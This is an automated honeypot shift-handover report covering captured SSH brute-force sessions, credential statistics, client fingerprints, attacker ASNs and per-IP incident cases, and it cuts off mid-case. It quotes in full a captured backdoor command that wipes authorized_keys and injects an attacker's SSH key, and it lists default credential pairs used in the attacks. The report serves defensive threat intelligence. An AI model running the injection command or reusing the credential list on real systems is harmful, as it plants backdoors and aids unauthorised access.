# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-13 |
| **Generated At** | 2026-07-13T22:59:07Z |
| **Shift Time** | 22:59 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **131** |
| Confirmed Threats | **109** |
| False Positives Filtered | **22** (16.8%) |
| Unique Attacker IPs | **77** |
| Countries of Origin | **25** |
| High Severity Cases | **54** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **77** |
| Malware Samples Analyzed | **4** HIGH · **33** MED · 8 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **86** |
| Unique Credential Pairs | **36** |
| Unique Usernames | **15** |
| Unique Passwords | **32** |
| Successful Auth Pairs | **70** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 34 |
| `admin` | 12 |
| `blank` | 6 |
| `345gs5662d34` | 5 |
| `ftpuser` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `admin` | 5 |
| `345gs5662d34` | 5 |
| `3245gs5662d34` | 5 |
| `password` | 5 |
| `webadmin` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 5 |
| `ftpuser` | `password` | 5 |
| `test` | `webadmin` | 5 |
| `admin` | `qwe123!@#` | 4 |
| `admin` | `admin` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `admin` | `qwe123!@#` | `121.202.206.119` | 2026-07-13T20:56:12 |
| `ubnt` | `ubnt2` | `111.70.39.214` | 2026-07-13T20:56:12 |
| `admin` | `qwe123!@#` | `111.70.23.236` | 2026-07-13T20:56:27 |
| `admin` | `qwe123!@#` | `10.0.0.73` | 2026-07-13T20:56:40 |
| `pi` | `12345` | `196.189.124.229` | 2026-07-13T21:00:11 |
| `ubnt` | `ubnt2` | `10.0.0.73` | 2026-07-13T21:00:25 |
| `root` | `love123` | `10.0.0.73` | 2026-07-13T21:00:43 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-13T21:04:24 |
| `pi` | `12345` | `10.0.0.73` | 2026-07-13T21:04:37 |
| `root` | `love123` | `185.242.3.195` | 2026-07-13T21:05:39 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `35.203.210.127` | 2026-07-13T21:15:30 |
| `root` | `ubnt` | `223.197.145.126` | 2026-07-13T21:19:16 |
| `ubuntu` | `admin1234567` | `185.242.3.195` | 2026-07-13T21:21:34 |
| `blank` | `asdfgh` | `103.147.248.44` | 2026-07-13T21:22:33 |
| `root` | `ubnt` | `14.33.93.214` | 2026-07-13T21:22:38 |
| `blank` | `asdfgh` | `150.228.225.198` | 2026-07-13T21:22:43 |
| `root` | `ubnt` | `14.194.128.158` | 2026-07-13T21:22:51 |
| `blank` | `asdfgh` | `190.12.109.162` | 2026-07-13T21:26:02 |
| `blank` | `asdfgh` | `60.223.251.132` | 2026-07-13T21:26:11 |
| `blank` | `qwerty1` | `182.151.45.136` | 2026-07-13T21:29:23 |
| `blank` | `qwerty1` | `200.58.83.79` | 2026-07-13T21:29:32 |
| `ubuntu` | `admin1234567` | `10.0.0.73` | 2026-07-13T21:37:56 |
| `root` | `00` | `37.238.45.202` | 2026-07-13T21:44:50 |
| `root` | `00` | `82.102.188.117` | 2026-07-13T21:45:02 |
| `root` | `00` | `183.247.171.186` | 2026-07-13T21:48:41 |
| `root` | `00` | `211.114.40.60` | 2026-07-13T21:48:52 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-13T21:50:49 |
| `root` | `sw` | `10.0.0.73` | 2026-07-13T21:50:49 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-13T21:50:50 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-07-13T21:50:52 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-07-13T21:50:53 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-13T21:50:56 |
| `user0` | `user0` | `10.0.0.73` | 2026-07-13T21:52:14 |
| `user0` | `3245gs5662d34` | `10.0.0.73` | 2026-07-13T21:52:18 |
| `root` | `insecure` | `196.28.226.124` | 2026-07-13T21:52:26 |
| `root` | `insecure` | `67.85.146.216` | 2026-07-13T21:52:38 |
| `root` | `123123a@` | `10.0.0.73` | 2026-07-13T21:53:18 |
| `root` | `insecure` | `122.254.30.34` | 2026-07-13T21:56:04 |
| `root` | `qwe!@#123QWE` | `185.242.3.195` | 2026-07-13T21:58:33 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-13T22:01:59 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-13T22:01:59 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-13T22:02:09 |
| `support` | `support` | `176.53.159.196` | 2026-07-13T22:10:45 |
| `ftpuser` | `password` | `65.20.187.47` | 2026-07-13T22:11:20 |
| `ftpuser` | `password` | `182.60.128.241` | 2026-07-13T22:11:28 |
| `support` | `support` | `10.0.0.73` | 2026-07-13T22:12:02 |
| `root` | `admin` | `104.225.250.214` | 2026-07-13T22:13:33 |
| `admin` | `MODEMadmin` | `223.197.153.138` | 2026-07-13T22:14:38 |
| `ftpuser` | `password` | `36.39.140.2` | 2026-07-13T22:14:54 |
| `root` | `qwe!@#123QWE` | `10.0.0.73` | 2026-07-13T22:15:11 |
| `ftpuser` | `password` | `10.0.0.73` | 2026-07-13T22:15:17 |
| `admin` | `MODEMadmin` | `65.20.163.103` | 2026-07-13T22:18:02 |
| `root` | `Admin123!@#` | `211.178.165.251` | 2026-07-13T22:18:27 |
| `admin` | `MODEMadmin` | `10.0.0.73` | 2026-07-13T22:18:31 |
| `test1` | `1qaz@WSX` | `189.146.59.77` | 2026-07-13T22:21:34 |
| `345gs5662d34` | `345gs5662d34` | `189.146.59.77` | 2026-07-13T22:21:37 |
| `test1` | `3245gs5662d34` | `189.146.59.77` | 2026-07-13T22:21:37 |
| `root` | `Admin123!@#` | `122.170.100.253` | 2026-07-13T22:21:51 |
| `root` | `Admin123!@#` | `45.181.101.95` | 2026-07-13T22:22:01 |
| `root` | `qingdao@123` | `185.242.3.195` | 2026-07-13T22:36:23 |
| `test` | `webadmin` | `117.2.123.19` | 2026-07-13T22:40:14 |
| `postgres` | `Password` | `101.13.4.119` | 2026-07-13T22:40:47 |
| `test` | `webadmin` | `196.28.226.124` | 2026-07-13T22:43:51 |
| `test` | `webadmin` | `14.194.128.158` | 2026-07-13T22:43:59 |
| `test` | `webadmin` | `10.0.0.73` | 2026-07-13T22:44:18 |
| `pi` | `123456789` | `206.0.8.204` | 2026-07-13T22:44:33 |
| `cc` | `cc123` | `10.0.0.73` | 2026-07-13T22:47:58 |
| `cc` | `3245gs5662d34` | `10.0.0.73` | 2026-07-13T22:48:04 |
| `pi` | `123456789` | `85.195.9.20` | 2026-07-13T22:48:13 |
| `root` | `qingdao@123` | `10.0.0.73` | 2026-07-13T22:53:11 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **131** |
| Sessions with Fingerprint | **10** |
| Unique HASSH Fingerprints | **10** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 34 |
| libssh | 17 |
| Go SSH scanner | 9 |
| Paramiko (Python) | 8 |
| Unknown | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 34 | 32 |
| `a2de0f306611...` | Mirai/variant | 8 | 2 |
| `16443846184e...` | Generic scanner | 6 | 1 |
| `03a80b21afa8...` | Modern SSH client | 3 | 1 |
| `98f63c4d9c87...` | Generic scanner | 2 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 34 | 32 | Mirai/variant |
| `95420f9d932d...` | libssh | 13 | 4 | — |
| `a2de0f306611...` | Paramiko (Python) | 8 | 2 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 6 | 1 | Generic scanner |
| `03a80b21afa8...` | libssh | 3 | 1 | Modern SSH client |
| `98f63c4d9c87...` | Go SSH scanner | 2 | 2 | Generic scanner |
| `dd9bcf093c35...` | Unknown | 2 | 2 | Mirai/variant |
| `5bd26477da54...` | PuTTY | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `189.146.59.77`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **77** |
| Unique ASNs | **51** |
| High-Risk ASNs | **43** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS22773` | Cox Communications Inc. | 8 | MEDIUM |
| `AS396982` | Google LLC | 5 | LOW |
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS46562` | Performive LLC | 3 | MEDIUM |
| `AS398324` | Censys, Inc. | 3 | HIGH |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 2 | HIGH |
| `AS17421` | Mobile Business Group | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (53)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-12c8a72b0b18

| Field | Detail |
|---|---|
| **Source IP** | `111.70.39[.]214` |
| **First Seen** | 2026-07-13 20:56 |
| **Last Seen** | 2026-07-13 20:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 20:56:07` | `cowrie.session.connect` |
| `2026-07-13 20:56:10` | `cowrie.client.version` |
| `2026-07-13 20:56:10` | `cowrie.client.kex` |
| `2026-07-13 20:56:12` | `cowrie.login.success` |
| `2026-07-13 20:56:14` | `cowrie.direct-tcpip.request` |
| `2026-07-13 20:56:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.39[.]214` to AbuseIPDB if not already reported
- [ ] Block `111.70.39[.]214` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3e015ad8eb9

| Field | Detail |
|---|---|
| **Source IP** | `121.202.206[.]119` |
| **First Seen** | 2026-07-13 20:56 |
| **Last Seen** | 2026-07-13 20:56 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 20:56:08` | `cowrie.session.connect` |
| `2026-07-13 20:56:09` | `cowrie.client.version` |
| `2026-07-13 20:56:09` | `cowrie.client.kex` |
| `2026-07-13 20:56:12` | `cowrie.login.success` |
| `2026-07-13 20:56:13` | `cowrie.direct-tcpip.request` |
| `2026-07-13 20:56:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.202.206[.]119` to AbuseIPDB if not already reported
- [ ] Block `121.202.206[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98d953e7d038

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]236` |
| **First Seen** | 2026-07-13 20:56 |
| **Last Seen** | 2026-07-13 20:56 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 20:56:23` | `cowrie.session.connect` |
| `2026-07-13 20:56:24` | `cowrie.client.version` |
| `2026-07-13 20:56:24` | `cowrie.client.kex` |
| `2026-07-13 20:56:27` | `cowrie.login.success` |
| `2026-07-13 20:56:28` | `cowrie.direct-tcpip.request` |
| `2026-07-13 20:56:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]236` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]236` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b00855c8d42

| Field | Detail |
|---|---|
| **Source IP** | `196.189.124[.]229` |
| **First Seen** | 2026-07-13 21:00 |
| **Last Seen** | 2026-07-13 21:00 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 21:00:07` | `cowrie.session.connect` |
| `2026-07-13 21:00:09` | `cowrie.client.version` |
| `2026-07-13 21:00:09` | `cowrie.client.kex` |
| `2026-07-13 21:00:11` | `cowrie.login.success` |
| `2026-07-13 21:00:12` | `cowrie.direct-tcpip.request` |
| `2026-07-13 21:00:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.124[.]229` to AbuseIPDB if not already reported
- [ ] Block `196.189.124[.]229` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c26048e0cb2d

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-13 21:05 |
| **Last Seen** | 2026-07-13 21:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 21:05:36` | `cowrie.session.connect` |
| `2026-07-13 21:05:37` | `cowrie.client.version` |
| `2026-07-13 21:05:37` | `cowrie.client.kex` |
| `2026-07-13 21:05:39` | `cowrie.login.success` |
| `2026-07-13 21:05:40` | `cowrie.session.params` |
| `2026-07-13 21:05:40` | `cowrie.command.input` |
| `2026-07-13 21:05:40` | `cowrie.log.closed` |
| `2026-07-13 21:05:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00532fe5cc11

| Field | Detail |
|---|---|
| **Source IP** | `223.197.145[.]126` |
| **First Seen** | 2026-07-13 21:19 |
| **Last Seen** | 2026-07-13 21:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 21:19:13` | `cowrie.session.connect` |
| `2026-07-13 21:19:13` | `cowrie.client.version` |
| `2026-07-13 21:19:13` | `cowrie.client.kex` |
| `2026-07-13 21:19:16` | `cowrie.login.success` |
| `2026-07-13 21:19:17` | `cowrie.direct-tcpip.request` |
| `2026-07-13 21:19:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.145[.]126` to AbuseIPDB if not already reported
- [ ] Block `223.197.145[.]126` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de122727a051

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-13 21:21 |
| **Last Seen** | 2026-07-13 21:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 21:21:34` | `cowrie.session.connect` |
| `2026-07-13 21:21:34` | `cowrie.client.version` |
| `2026-07-13 21:21:34` | `cowrie.client.kex` |
| `2026-07-13 21:21:34` | `cowrie.login.success` |
| `2026-07-13 21:21:35` | `cowrie.session.params` |
| `2026-07-13 21:21:35` | `cowrie.command.input` |
| `2026-07-13 21:21:35` | `cowrie.log.closed` |
| `2026-07-13 21:21:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e409c9769a08

| Field | Detail |
|---|---|
| **Source IP** | `103.147.248[.]44` |
| **First Seen** | 2026-07-13 21:22 |
| **Last Seen** | 2026-07-13 21:22 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 21:22:30` | `cowrie.session.connect` |
| `2026-07-13 21:22:31` | `cowrie.client.version` |
| `2026-07-13 21:22:31` | `cowrie.client.kex` |
| `2026-07-13 21:22:33` | `cowrie.login.success` |
| `2026-07-13 21:22:34` | `cowrie.direct-tcpip.request` |
| `2026-07-13 21:22:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.147.248[.]44` to AbuseIPDB if not already reported
- [ ] Block `103.147.248[.]44` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78c846f650cf

| Field | Detail |
|---|---|
| **Source IP** | `14.33.93[.]214` |
| **First Seen** | 2026-07-13 21:22 |
| **Last Seen** | 2026-07-13 21:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 21:22:35` | `cowrie.session.connect` |
| `2026-07-13 21:22:36` | `cowrie.client.version` |
| `2026-07-13 21:22:36` | `cowrie.client.kex` |
| `2026-07-13 21:22:38` | `cowrie.login.success` |
| `2026-07-13 21:22:39` | `cowrie.direct-tcpip.request` |
| `2026-07-13 21:22:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.33.93[.]214` to AbuseIPDB if not already reported
- [ ] Block `14.33.93[.]214` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c33fd9dc3cb9

| Field | Detail |
|---|---|
| **Source IP** | `150.228.225[.]198` |
| **First Seen** | 2026-07-13 21:22 |
| **Last Seen** | 2026-07-13 21:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 21:22:40` | `cowrie.session.connect` |
| `2026-07-13 21:22:41` | `cowrie.client.version` |
| `2026-07-13 21:22:41` | `cowrie.client.kex` |
| `2026-07-13 21:22:43` | `cowrie.login.success` |
| `2026-07-13 21:22:44` | `cowrie.direct-tcpip.request` |
| `2026-07-13 21:22:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.228.225[.]198` to AbuseIPDB if not already reported
- [ ] Block `150.228.225[.]198` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e30aeb17828

| Field | Detail |
|---|---|
| **Source IP** | `14.194.128[.]158` |
| **First Seen** | 2026-07-13 21:22 |
| **Last Seen** | 2026-07-13 21:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 21:22:49` | `cowrie.session.connect` |
| `2026-07-13 21:22:49` | `cowrie.client.version` |
| `2026-07-13 21:22:49` | `cowrie.client.kex` |
| `2026-07-13 21:22:51` | `cowrie.login.success` |
| `2026-07-13 21:22:51` | `cowrie.direct-tcpip.request` |
| `2026-07-13 21:22:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.194.128[.]158` to AbuseIPDB if not already reported
- [ ] Block `14.194.128[.]158` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0752aa09661f

| Field | Detail |
|---|---|
| **Source IP** | `190.12.109[.]162` |
| **First Seen** | 2026-07-13 21:25 |
| **Last Seen** | 2026-07-13 21:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 21:25:59` | `cowrie.session.connect` |
| `2026-07-13 21:26:00` | `cowrie.client.version` |
| `2026-07-13 21:26:00` | `cowrie.client.kex` |
| `2026-07-13 21:26:02` | `cowrie.login.success` |
| `2026-07-13 21:26:02` | `cowrie.direct-tcpip.request` |
| `2026-07-13 21:26:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.12.109[.]162` to AbuseIPDB if not already reported
- [ ] Block `190.12.109[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-055856672ae5

| Field | Detail |
|---|---|
| **Source IP** | `60.223.251[.]132` |
| **First Seen** | 2026-07-13 21:26 |
| **Last Seen** | 2026-07-13 21:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 21:26:08` | `cowrie.session.connect` |
| `2026-07-13 21:26:09` | `cowrie.client.version` |
| `2026-07-13 21:26:09` | `cowrie.client.kex` |
| `2026-07-13 21:26:11` | `cowrie.login.success` |
| `2026-07-13 21:26:11` | `cowrie.direct-tcpip.request` |
| `2026-07-13 21:26:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.223.251[.]132` to AbuseIPDB if not already reported
- [ ] Block `60.223.251[.]132` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f1c214daea0

| Field | Detail |
|---|---|
| **Source IP** | `182.151.45[.]136` |
| **First Seen** | 2026-07-13 21:29 |
| **Last Seen** | 2026-07-13 21:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 21:29:20` | `cowrie.session.connect` |
| `2026-07-13 21:29:21` | `cowrie.client.version` |
| `2026-07-13 21:29:21` | `cowrie.client.kex` |
| `2026-07-13 21:29:23` | `cowrie.login.success` |
| `2026-07-13 21:29:24` | `cowrie.direct-tcpip.request` |
| `2026-07-13 21:29:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.151.45[.]136` to AbuseIPDB if not already reported
- [ ] Block `182.151.45[.]136` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eff97aa4e609

| Field | Detail |
|---|---|
| **Source IP** | `200.58.83[.]79` |
| **First Seen** | 2026-07-13 21:29 |
| **Last Seen** | 2026-07-13 21:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 21:29:29` | `cowrie.session.connect` |
| `2026-07-13 21:29:30` | `cowrie.client.version` |
| `2026-07-13 21:29:30` | `cowrie.client.kex` |
| `2026-07-13 21:29:32` | `cowrie.login.success` |
| `2026-07-13 21:29:32` | `cowrie.direct-tcpip.request` |
| `2026-07-13 21:29:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.58.83[.]79` to AbuseIPDB if not already reported
- [ ] Block `200.58.83[.]79` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c47368659115

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-13 21:42 |
| **Last Seen** | 2026-07-13 21:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 21:42:42` | `cowrie.session.connect` |
| `2026-07-13 21:42:42` | `cowrie.client.version` |
| `2026-07-13 21:42:42` | `cowrie.client.kex` |
| `2026-07-13 21:42:43` | `cowrie.login.success` |
| `2026-07-13 21:42:44` | `cowrie.session.params` |
| `2026-07-13 21:42:44` | `cowrie.command.input` |
| `2026-07-13 21:42:44` | `cowrie.log.closed` |
| `2026-07-13 21:42:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1aab618f7f43

| Field | Detail |
|---|---|
| **Source IP** | `37.238.45[.]202` |
| **First Seen** | 2026-07-13 21:44 |
